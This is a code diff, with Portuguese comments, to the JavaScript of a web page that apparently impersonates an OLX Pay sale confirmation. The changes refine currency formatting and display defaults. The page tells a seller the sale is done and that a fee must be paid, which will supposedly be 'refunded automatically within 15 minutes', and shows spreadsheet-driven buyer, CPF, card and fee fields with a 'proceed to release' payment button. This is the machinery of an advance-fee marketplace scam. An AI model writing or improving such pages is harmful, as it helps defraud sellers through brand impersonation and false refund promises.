@@ -5,20 +5,49 @@ const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tM
 
 const mainContainer = document.getElementById('main-container');
 
-// --- Função Auxiliar de Formatação (NOVA) ---
+// --- Função Auxiliar de Formatação e Limpeza (REVISADA) ---
 const formatValueForClient = (value) => {
-    if (!value) return '---';
-    // 1. Remove R$ e espaços
-    let valueStr = String(value).replace(/R\$\s*/g, '').trim();
+    if (!value) return ''; 
+    let valueStr = String(value).trim();
 
-    // 2. Verifica se é um número inteiro de 4+ dígitos (ex: '1000', '15000') sem separadores e aplica o ponto de milhar.
-    if (valueStr.match(/^\d{4,}$/)) { 
-        valueStr = valueStr.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    // 1. Limpa o prefixo 'R$' para processamento
+    valueStr = valueStr.replace(/R\$\s*/g, '');
+    
+    // 2. Se for texto, retorna o texto (Ex: Grátis, Inclusa)
+    if (valueStr.match(/gr[aá]tis|inclusa|horas/i) || valueStr.match(/vendas|avaliação|taxa de/i)) {
+        return valueStr;
+    }
+
+    // 3. Tenta formatar como número
+    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.'); // Remove ponto de milhar e transforma vírgula em ponto
+    let number = parseFloat(numericStr);
+    
+    if (!isNaN(number)) {
+        // Aplica formatação de milhar (ponto) e centavos (vírgula)
+        // Isso garante o formato 1.000,00
+        return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
     }
     
-    // O valor já formatado (ex: 1.000,00 ou 12 horas) é retornado.
     return valueStr;
 }
+
+// --- NOVO HELPER para decidir o prefixo e o default ---
+const getDisplayValue = (data, isCurrencyField, defaultText) => {
+    const formatted = formatValueForClient(data);
+    
+    if (formatted === '') {
+        return isCurrencyField ? `R$ ${defaultText}` : defaultText;
+    }
+    
+    // Se for campo de moeda, mas for um texto como 'Grátis' ou 'Inclusa', retorna o texto puro.
+    if (isCurrencyField && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) {
+        return formatted;
+    }
+    
+    // Senão, prefixa com R$ se for campo de moeda, ou retorna o valor formatado
+    return isCurrencyField ? `R$ ${formatted}` : formatted;
+}
+
 
 // --- Inicialização Automática ---
 (async function init() {
@@ -35,6 +64,7 @@ const formatValueForClient = (value) => {
     const json = await response.json();
 
     if (json.status === 'success') {
+      // SÓ CHAMA O RENDER SE TIVER SUCESSO. ISSO GARANTE QUE A PÁGINA SÓ APARECE POPULADA.
       renderContainer(json.data);
     } else {
       renderError(json.message || 'Pedido não encontrado.');
@@ -62,7 +92,6 @@ function renderContainer(dadosBrutos) {
   const content = criarElemento('div', { class: 'content' });
 
   // Variáveis de exibição
-  const taxa = formatValueForClient(dados.taxa) || 'R$ --';
   const prazo = dados.prazo || '15 minutos';
   
   // Link dinâmico vindo da planilha
@@ -70,13 +99,13 @@ function renderContainer(dadosBrutos) {
 
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">R$ ${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
     
     <h2>Detalhes da transação</h2>
     <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
-    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>R$ ${formatValueForClient(dados.valor) || '---'}</span></p>
-    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>R$ ${formatValueForClient(dados.frete) || 'Grátis'}</span></p>
-    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>R$ ${formatValueForClient(dados.tarifa) || 'Inclusa'}</span></p>
+    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
+    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${getDisplayValue(dados.frete, true, 'Grátis')}</span></p>
+    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${getDisplayValue(dados.tarifa, true, 'Inclusa')}</span></p>
     ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
     ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}
 
@@ -122,7 +151,7 @@ function renderContainer(dadosBrutos) {
     id: 'btn-pagamento', 
     class: 'button hidden', 
     href: linkFinal 
-  }, 'Seguir para a liberação'); // <-- TEXTO ALTERADO AQUI
+  }, 'Seguir para a liberação'); // <-- TEXTO DO BOTÃO AJUSTADO
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
